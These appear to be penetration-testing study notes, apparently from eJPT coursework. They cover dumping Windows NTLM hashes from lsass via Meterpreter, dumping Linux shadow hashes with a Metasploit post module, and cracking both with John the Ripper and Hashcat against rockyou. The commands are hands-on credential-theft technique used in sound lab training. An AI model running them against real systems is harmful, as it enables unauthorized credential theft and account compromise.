## Windows: Dumping and Cracking NTLM Hashes
**Dumping**
1. On target machine: pgrep lsass -> migrate 688 -> hashdump

**Cracking**
https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/5-post-exploit/crack-hashes

1. `john --list=formats | grep NT netntlm, netntlm-naive, net-sha1, nk, notes, md5ns, nsec3, NT, o10glogon`
2. `john --format=NT hashes.txt` It will use the default wordlist
3. `gzip -d /usr/share/wordlists/rockyou.txt.gz` `john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`

## Linux: Dumping and Cracking Hashes
**Dumping hashes**
`$1=MD5`
`$2 = Blowfish`
`$5 = SHA-256`
`$6 = SHA-512`

only read by root: cat /etc/shadow
MSF module:     An MSF module can be used for hash dumping

CTRL+Z to background the session
sessions -u 1
session 2

use post/linux/gather/hashdump
set SESSION 2
run

**Cracking hashes**
John the ripper
1. gzip -d /usr/share/wordlists/rockyou.txt.gz
2. `john --format=sha512crypt /root/.msf4/loot/20230429153134_default_192.22.107.3_linux.hashes_083080.txt --wordlist=/usr/share/wordlists/rockyou.txt`

Hashcat
1. `hashcat --help | grep 1800 1800 | sha512crypt $6$, SHA512 (Unix) | Operating Systems`
1. `hashcat -a 3 -m 1800 /root/.msf4/loot/20230429153134_default_192.22.107.3_linux.hashes_083080.txt /usr/share/wordlists/rockyou.txt`